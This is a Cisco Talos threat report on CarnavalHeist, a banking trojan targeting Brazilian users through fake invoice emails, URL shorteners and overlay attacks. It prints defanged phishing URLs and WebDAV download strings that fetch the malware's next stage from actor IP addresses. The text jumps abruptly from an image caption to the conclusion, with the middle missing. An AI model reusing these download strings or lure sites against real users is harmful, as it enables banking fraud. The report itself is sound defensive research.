    <h1 class="text-center">New banking trojan “CarnavalHeist” targets Brazil with overlay attacks</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/cisco/">Cisco Talos</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="May 31, 2024 08:00">
            Friday, May 31, 2024 08:00
        </time>

        <div class="m-3">
                            <a href="/category/threat-spotlight/" class="category primary-category">
                                Threat Spotlight
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <ul><li>Since February 2024, Cisco Talos has been observing an active campaign targeting Brazilian users with a new banking trojan called “CarnavalHeist.” Many of the observed tactics, techniques and procedures (TTPs) are common among other banking trojans coming out of Brazil. This family has also been <a href="https://harfanglab.io/en/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/" rel="noreferrer noopener"><u>referenced as AllaSenha</u></a> in a recent report.&nbsp;</li><li>Talos attributes with high confidence the development and operation of CarnavalHeist to Brazilian actors who could be identified because of some operational mistakes made during the domain registration process for their payload-hosting sites.&nbsp;</li><li>The current campaign uses financial-related themes in spam emails, Delphi-based DLLs, overlay attack methods, and usual input capture techniques, such as keylogging and screen capture. There are also names of traditional Brazilian banks hardcoded in the malware. &nbsp;</li><li>Unique to CarnavalHeist, however, is the dynamic use of a Python-based loader as part of the DLL injection process and the specific targeting of banking desktop applications to enable tracking of other Brazilian financial institutions.&nbsp;</li></ul><h2 id="carnavalheist-has-brazilian-origins">CarnavalHeist has Brazilian origins&nbsp;</h2><p>Talos assesses with high confidence that the CarnavalHeist malware is of Brazilian origin and primarily targets Brazilian users based on our observations of the Portuguese language being used throughout all aspects of the infection chain and the malware itself, including the use of Brazilian slang to describe some bank names, and a notable lack of other language variants thus far. The command and control (C2) infrastructure exclusively uses the BrazilSouth availability zone on Microsoft Azure to control infected machines, and they specifically target prominent Brazilian financial institutions. &nbsp;</p><p>We further assess that the current wave of activity has been ongoing since the beginning of February based on the volume and timeline of observable C2 domain activity, although we have observed related samples and variants that were uploaded to VirusTotal in November and December 2023, indicating that the malware has been in development since at least late 2023. As of May 2024, CarnavalHeist is still active, and our analysis remains ongoing as we continue to identify new samples.&nbsp;</p><h2 id="financial-themed-spam-as-initial-execution-method">Financial-themed spam as initial execution method&nbsp;</h2><p>CarnavalHeist infection begins with a financially themed unsolicited email using a fake invoice as a lure to get the user to open a malicious URL.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-5937aa99-44ea-42ed-985c-40837df35c6f.png" class="kg-image" alt="" loading="lazy" width="865" height="508" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-5937aa99-44ea-42ed-985c-40837df35c6f.png 600w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-5937aa99-44ea-42ed-985c-40837df35c6f.png 865w" sizes="(min-width: 720px) 720px"><figcaption><i><em class="italic" style="white-space: pre-wrap;">An example unsolicited email distributing CarnavalHeist.</em></i></figcaption></figure><p>The malicious link uses the <a href="https://is.gd/faq.php" rel="noreferrer noopener"><u>IS.GD</u></a> URL shortener service to redirect users to the first-stage payload. The URL usually looks similar to some of these examples:&nbsp;</p><ul><li>https://is[.]gd/38qeon?0177551.5510&nbsp;</li><li>https://is[.]gd/ROnj3W?0808482.5176&nbsp;</li><li>https://is[.]gd/a4dpQP?000324780473.85375532000&nbsp;</li></ul><p>This URL redirects the user to the server hosting the fake web page where the users are supposed to download their invoice. We have observed different domains being used in this step, but all contain references to “Nota Fiscal Eletrônica,” the Portuguese term for invoice.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-8a1b1a3d-d5d6-4403-8354-1264acc5d29d.png" class="kg-image" alt="" loading="lazy" width="657" height="376" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-8a1b1a3d-d5d6-4403-8354-1264acc5d29d.png 600w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-8a1b1a3d-d5d6-4403-8354-1264acc5d29d.png 657w"><figcaption><i><em class="italic" style="white-space: pre-wrap;">Content of website where user is redirected to download the malware</em></i><span style="white-space: pre-wrap;">.&nbsp;</span></figcaption></figure><p>Some of the domains we observed being used to host these pages are:&nbsp;</p><ul><li>https://notafiscaleletronica[.]nf-e[.]pro/danfe/?notafiscal=00510242.500611&nbsp;</li><li>https://nota-fiscal[.]nfe-digital[.]top/nota-estadual/?notafiscal=00792011.977347&nbsp;</li><li>https://nfe-visualizer[.]app[.]br/notas/?notafiscal=000851113082.35493424000&nbsp;</li></ul><p>The download target is the final link in this step, and it uses WebDAV to download the next-stage payload:&nbsp;</p><ul><li>search:query=NotaFiscal.pdf&amp;crumb=location:\\4[.]203[.]105[.]118@80\Documentos&amp;displayname=Downloads&nbsp;</li><li>search:query=NotaFiscal.pdf&amp;crumb=location:\\191[.]233[.]248[.]170@80\Documentos&amp;displayname=Downloads&nbsp;</li></ul><p>This command ends up downloading a LNK file, which then executes the next stage of the infection. The LNK file’s metadata illustrates a common method threat actors use to execute malicious scripts and commands.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-9aad996b-c281-4507-b959-91de5b324f0f.png" class="kg-image" alt="A screenshot of a computer

There are some aspects of the code and malware that hint at sophistication, whether borrowed or their own, but are then short circuited or made pointless by mistakes or odd choices elsewhere. For example, the DGA algorithm for some of the Python cradles goes through the trouble of generating a list of five different potential subdomains to be used on any given day. The list of subdomains is then referenced by Python’s random choice function, but the subdomain list is sliced in a way that only the last option is ever used. This is then corrected to use all choices in another version of the Python script we observed. The actor is worth monitoring, as the ability to incorporate complexity within their malware is more concerning than the initially observed missteps, which can always be corrected in future development iterations.
